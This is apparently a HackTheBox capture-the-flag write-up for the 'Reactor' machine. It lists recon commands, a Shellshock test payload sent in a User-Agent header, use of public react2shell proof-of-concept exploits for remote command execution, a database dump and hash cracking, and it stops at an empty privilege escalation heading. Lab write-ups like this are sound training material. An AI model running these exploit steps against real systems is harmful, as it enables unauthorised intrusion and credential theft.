## Reactor-HackTheBox🏴󠁧󠁢󠁥󠁮󠁧󠁿

### Recognition and Enumeration

#### First we're going to prove the conexión and run the host-
```bash
 ping -c3 10.129.11.10
```

<img width="968" height="227" alt="image" src="https://github.com/user-attachments/assets/9a83a8ef-2cc8-4c7a-8f69-23cbd5f31fd6" />


#### Then we're going to check the open ports with nmap.
```bash
nmap -sV -sC -p- --min-rate 5000 10.129.11.10
```

<img width="963" height="1042" alt="image" src="https://github.com/user-attachments/assets/a1e81bda-7af4-4484-a4c4-c8e305a4ae62" />


#### We're going to use foroxbuster for look at the page.
```bash
feroxbuster -u http://10.129.11.10:3000 -w /usr/share/wordlists/dirb/common.txt
```

<img width="965" height="904" alt="image" src="https://github.com/user-attachments/assets/93dd40bd-5130-41ec-8fa1-bdf5136f561c" />


#### Now we do a force a  fuzzing and we will do an inspection of the JS chunks .
```bash
feroxbuster -u http://10.129.11.10:3000/cgi-bin/ -w /usr/share/wordlists/dirb/common.txt -x sh,cgi,pl,py
```

<img width="970" height="569" alt="image" src="https://github.com/user-attachments/assets/b854f29d-79dc-44db-9dd3-e3096245178d" />


#### We're going to look at the ressult if the vulnerability exists at the file.
```bash
 curl -H "User-Agent: () { :; }; echo; /usr/bin/id" http://10.129.11.10:3000/cgi-bin/test.sh
```

<img width="971" height="1056" alt="image" src="https://github.com/user-attachments/assets/66f653fe-54b1-444c-99c8-106d59f65f77" />


#### Then we enter to the website for search something to crack.
```bash
http://10.129.11.10:3000/
```

<img width="985" height="384" alt="image" src="https://github.com/user-attachments/assets/22b8f15f-a38c-4286-9e06-d70e74ff478d" />


#### We'r going to click cnt + F5 for search the packets at the network on the webside.

<img width="964" height="454" alt="image" src="https://github.com/user-attachments/assets/fdecab65-eb01-47a6-8508-31c49331c5e8" />


#### We're going to use gobuster for search the hidden ports.
```bash
gobuster dir -u http://10.129.11.10:3000 -w /usr/share/wordlists/dirb/common.txt
```

<img width="967" height="533" alt="image" src="https://github.com/user-attachments/assets/5bb36146-7b1e-411e-b2a6-0e8bd89d4163" />





#### First of all, we will confirm that we can obtain a password without needing a key file using ssh
```bash
ssh -v elena@10.129.11.10
```

<img width="962" height="1046" alt="image" src="https://github.com/user-attachments/assets/fedcc78a-6351-4a79-9f6c-0ec797d9689d" />


### Exploitation


#### Now we need to git clone the CVE and the react2shell for exploit
```bash
 git clone https://github.com/dwisiswant0/CVE-2025-55182.git
git clone https://github.com/p3ta00/react2shell-poc.git
```

#### We're going to use the exploit.
```bash
sudo python3 react2shell-poc.py -t http://10.129.11.10:300
0 -c “id”
```

<img width="967" height="545" alt="image" src="https://github.com/user-attachments/assets/c3822457-f10c-4976-b484-4edc60723d1d" />


#### We found a sql database
```bash
python3 react2shell-poc.py -t http://10.129.11.10:3000 -c "sqlite3 /opt/reactor-app/reactor.db '.dump'"
```

<img width="963" height="691" alt="image" src="https://github.com/user-attachments/assets/640854b0-9ffe-4543-a470-c293f45022b3" />


#### Now we use hashcat for crack the key.
```bash
hashcat -m 0 39d97110eafe2a9a68639812cd271e8e /usr/share/wordlists/rockyou.txt
```

<img width="967" height="916" alt="image" src="https://github.com/user-attachments/assets/b4200d19-d9e5-4e30-95c8-00fa28fac6f2" />


#### Now we wnter with ssh
```bash
ssh engineer@10.129.11.10
```

*We have now the user key*


### Escalation of Privileges




